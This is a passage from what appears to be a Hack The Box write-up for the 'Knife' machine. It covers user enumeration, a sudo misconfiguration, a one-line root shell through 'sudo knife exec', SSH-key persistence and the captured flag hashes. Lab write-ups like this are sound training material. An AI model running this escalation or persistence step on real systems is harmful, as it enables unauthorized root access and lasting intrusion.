</span><span class="z-text z-plain">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span></code></pre>
<p>There's an Ethernet interface and the loopback interface.</p>
<h3 id="hostname">Hostname</h3>
<p>What is Knife's hostname?</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">james@knife:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">knife
</span></code></pre>
<p>Yeah I know, very surprising.</p>
<h2 id="system-enumeration">System enumeration</h2>
<h3 id="flags">Flags</h3>
<p>If we check our home folder, we find the user flag.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">james@knife:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/james/user.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">e58e06d1b79c9ce06e9b30edc87529c0
</span></code></pre>
<h3 id="sudo-permissions">Sudo permissions</h3>
<p>Let's see if we can execute anything as another user with <code>sudo</code>.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">james@knife:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">Matching Defaults entries for james on knife:
</span><span class="z-text z-plain">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">User james may run the following commands on knife:
</span><span class="z-text z-plain">    (root) NOPASSWD: /usr/bin/knife
</span></code></pre>
<p>We do! We can execute the <code>/usr/bin/knife</code> binary as <code>root</code>.</p>
<h2 id="privilege-escalation-sudo-permissions">Privilege escalation (Sudo permissions)</h2>
<p>If we search <a href="https://gtfobins.github.io/">GTFOBins</a> for <code>knife</code>, we find
<a href="https://gtfobins.github.io/gtfobins/knife/">an entry</a>. Luckily, it has a
<a href="https://gtfobins.github.io/gtfobins/knife/#sudo">'Sudo' section</a>!</p>
<h3 id="exploitation-1">Exploitation</h3>
<p>I'll use the given command to abuse our <code>sudo</code> permissions, but I'll change the
shell to <code>/bin/bash</code>:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">james@knife:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo knife exec<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>E</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>exec &quot;/bin/bash -i&quot;<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">root@knife:/home/james#
</span></code></pre>
<p>Yay!</p>
<h3 id="establishing-persistence">Establishing persistence</h3>
<p>Let's use SSH to establish persistence.</p>
<p>Our home folder contains a <code>.ssh</code> folder. There's no existing private key, so
I'll create one, and I'll add the corresponding public key to <code>authorized_keys</code>.
Finally, I'll connect over SSH to Knife as <code>root</code>.</p>
<h2 id="system-enumeration-1">System enumeration</h2>
<p>If we run <code>whoami</code>, we see that we're <code>root</code>!</p>
<h3 id="flags-1">Flags</h3>
<p>As usual, we can find the root flag in our home folder.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@knife:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/root/root.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">2133da3bba64d6c553b463b81e96acbd
</span></code></pre>
<h1 id="afterwords">Afterwords</h1>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/knife/success.png" alt="Success" /></p>
<p>That's it for this box! 🎉</p>
<p>I rated both the user and root flags as 'Very easy' to obtain. The foothold was quite
easy to find and trivial to exploit. The privilege escalation only required
proper enumeration to identify and was very easy to take advantage of.</p>
<p>Thanks for reading!</p>
</section>
</article>

    </main>

        <footer></footer>

    </body>
</html>
